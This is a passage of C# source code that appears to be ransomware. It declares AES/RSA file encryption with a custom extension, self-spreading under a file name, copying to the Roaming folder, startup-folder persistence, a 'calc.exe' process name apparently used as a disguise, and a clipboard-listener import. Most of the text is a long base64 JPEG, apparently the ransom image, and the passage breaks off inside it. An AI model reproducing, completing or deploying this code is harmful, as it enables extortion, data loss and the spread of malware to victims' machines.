using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "whnmn";

	private static bool checkSpread = true;

	private static string spreadName = "whnmn.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "calc.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 2;

	private static string base64Image = "/9j/4AAQSkZJRgABAQEAYABgAAD/4RCKRXhpZgAATU0AKgAAAAgABAE7AAIAAAAIAAAISodpAAQAAAABAAAIUpydAAEAAAAQAAAQcuocAAcAAAgMAAAAPgAAAAAc6gAAAAghbHdhcmUAAAHqHAAHAAAIDAAACGQAAAAAHOosAHcAYQByAGUAAAD/4QpgaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49J++7vycgaWQ9J1c1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCc/Pg0KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyI+PHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj48cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0idXVpZDpmYWY1YmRkNS1iYTNkLTExZGEtYWQzMS1kMzNkNzUxODJmMWIiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIvPjxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSJ1dWlkOmZhZjViZGQ1LWJhM2QtMTFkYS1hZDMxLWQzM2Q3NTE4MmYxYiIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIj48ZGM6Y3JlYXRvcj48cmRmOlNlcSB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPjxyZGY6bGk+bWFsd2FyZTwvcmRmOmxpPjwvcmRmOlNlcT4NCgkJCTwvZGM6Y3JlYXRvcj48L3JkZjpEZXNjcmlwdGlvbj48L3JkZjpSREY+PC94OnhtcG1ldGE+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg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